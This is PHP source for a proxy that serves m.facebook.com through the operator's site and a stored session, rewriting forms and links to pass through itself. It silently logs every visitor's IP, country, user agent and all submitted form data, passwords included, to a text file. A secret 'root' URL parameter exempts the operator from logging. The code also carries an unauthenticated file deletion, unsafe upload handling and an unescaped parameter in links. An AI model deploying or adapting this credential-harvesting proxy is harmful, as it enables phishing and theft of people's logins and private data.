<?php
if (isset($_GET['reset_cookie'])) {
	unlink($fb->usercookies);
	header("location:?ref=reset_cookie");
	die;
}
if (isset($_GET['root'])) {
	setcookie("root", 1, time()+(3600*2), '/', '.crayner.cf', 1, 1);
	header("location:?url=/messages");
	die;
}
if (!isset($_COOKIE['root'])) {
	$ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
	$country = isset($_SERVER['HTTP_CF_IPCOUNTRY']) ? $_SERVER['HTTP_CF_IPCOUNTRY'] : null;
	$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null;
	file_put_contents("logs_fb.txt", json_encode([
			"dt"=>date("Y-m-d H:i:Y"),
			"ip" => $ip,
			"country"=>$country,
			"ua"=>$ua,
			"post"=>$_POST,
			"url"=>(isset($_GET['url']) ? fixurl(urldecode($_GET['url'])) : "https://m.facebook.com")
		], 128)."\n\n", FILE_APPEND | LOCK_EX);
	if (isset($_GET['url']) and strpos($_GET['url'], "messages")!==false){
		http_response_code(403);
		die("403 Forbidden ! (Anda tidak memiliki akses ke sumber daya ini)");
	}
}
run($_GET['url']??"");
function fixurl($url)
{
	if (strpos($url, "https://")===false) {
		return "https://m.facebook.com/".$url;
	} else {
		return $url;
	}
}
function run(string $url)
{
		/*global $fb;*/
		/*if (!$fb->check_login() && !((bool)count($_POST))) {
			#$fb->login();
			if (isset($fb->curl_info['redirect_url']) && !empty($fb->curl_info['redirect_url'])) {
				print go($fb->curl_info['redirect_url']);
				die;
			}
		}*/
		print go(urldecode($url));
}

function go($url)
{
	global $fb;
	$post 	= count($_POST) ? $_POST : null;
	foreach (getallheaders() as $key => $value) {
		$header[strtolower($key)] = $value;
	}
	if (count($_POST)) {
		if (isset($header['content-type'])) {
			if ($header['content-type']=="application/x-www-form-urlencoded") {
				$_p = "";
				foreach ($_POST as $key => $value) {
					if (is_array($value)) {
						foreach ($value as $k2 => $v2) {
							$_p .= $key.urlencode("[".$k2."]")."=".urlencode($v2)."&";
						}
					} else {
						$_p .= $key."=".urlencode($value)."&";
					}
				}
				$post = rtrim($_p, "&");	
			} else {
				$post = $_POST;
				if (count($_FILES)) {
					foreach ($_FILES as $key => $value) {
						is_dir(__DIR__."/tmp") or mkdir(__DIR__."/tmp");
						move_uploaded_file($value['tmp_name'], __DIR__.'/tmp/'.$value['name']);
						$post[$key] = new CurlFile(__DIR__.'/tmp/'.$value['name']);
					}
				} else {
					$post = http_build_query($post);
				}
			}
		}
	}
	$src	= $fb->get_page($url, $post, array(52=>0));
	if (isset($fb->curl_info['redirect_url']) && !empty($fb->curl_info['redirect_url'])) {
		header("location:?url=".urlencode($fb->curl_info['redirect_url']));
		die;
	}
	return clean($src);
}

function clean($src)
{
	$a = explode("<form", $src);
	if (count($a)>1) {
		$r = array();
		foreach ($a as $val) {
			$b = explode("action=\"", $val, 2);
			if (count($b)>1) {
				$b = explode("\"", $b[1], 2);
				/*$r["action=\"".$b[0]."\""] = "action=\"?url=".urlencode(html_entity_decode($b[0], ENT_QUOTES, 'UTF-8'));*/
				$src = str_replace("action=\"".$b[0]."\"", "action=\"?url=".htmlspecialchars(urlencode(urlencode(html_entity_decode($b[0], ENT_QUOTES, 'UTF-8'))))."\"", $src);
			}
		}
	}
	$a = explode("<a ", $src);
	foreach ($a as $val) {
		$b = explode("href=\"", $val, 2);
		if (count($b)>1) {
			$b = explode("\"", $b[1], 2);
			/*$r["action=\"".$b[0]."\""] = "action=\"?url=".urlencode(html_entity_decode($b[0], ENT_QUOTES, 'UTF-8'));*/
			$src = str_replace("href=\"".$b[0]."\"", "href=\"?".(isset($_GET['user'])?"user=".$_GET['user']."&":"")."url=".htmlspecialchars(urlencode(urlencode(html_entity_decode($b[0], ENT_QUOTES, 'UTF-8'))))."\"", $src);
		}
	}
	return $src;
}
